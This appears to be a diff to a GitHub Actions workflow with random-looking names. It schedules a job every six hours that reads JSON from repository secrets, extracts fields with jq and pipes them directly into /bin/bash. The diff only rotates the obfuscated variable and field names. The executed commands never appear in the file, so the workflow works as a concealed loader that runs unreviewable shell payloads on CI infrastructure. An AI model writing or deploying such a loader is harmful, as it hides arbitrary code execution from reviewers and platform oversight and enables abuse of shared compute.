@@ -1,25 +1,24 @@
 name: songbingjia7986
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 3/6 * * *'
-jobs:  # 26689
+    - cron: '38 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: songbingjia7986
         env:
-          vbci7478: ${{ secrets.vbci7478 }}
+          ame633: ${{ secrets.ame633 }}
         run: |
-          echo $vbci7478 | jq -r .odhpg604 | /bin/bash
-          echo $jawl6369 | jq -r .cbofz74 | /bin/bash
-          echo $pgtj9358 | jq -r .x41 | /bin/bash
-          echo $qb894 | jq -r .srqs86297 | /bin/bash
-          echo $ptst979 | jq -r .lchf73 | /bin/bash
-          echo $ra159 | jq -r .mjecl1509 | /bin/bash
-          echo $lpijc99 | jq -r .d3 | /bin/bash
-          echo $e67487 | jq -r .nq6 | /bin/bash
-          echo $hufhl21317 | jq -r .y90326 | /bin/bash
+          echo $ame633 | jq -r .eovo950 | /bin/bash
+          echo $pwhb34 | jq -r .wvkn5609 | /bin/bash
+          echo $k74712 | jq -r .ncxyi24138 | /bin/bash
+          echo $sdes38 | jq -r .v4703 | /bin/bash
+          echo $nwtyu26 | jq -r .esfap8 | /bin/bash
+          echo $llr413 | jq -r .korf4 | /bin/bash
+          echo $ojzb758 | jq -r .y73697 | /bin/bash
 
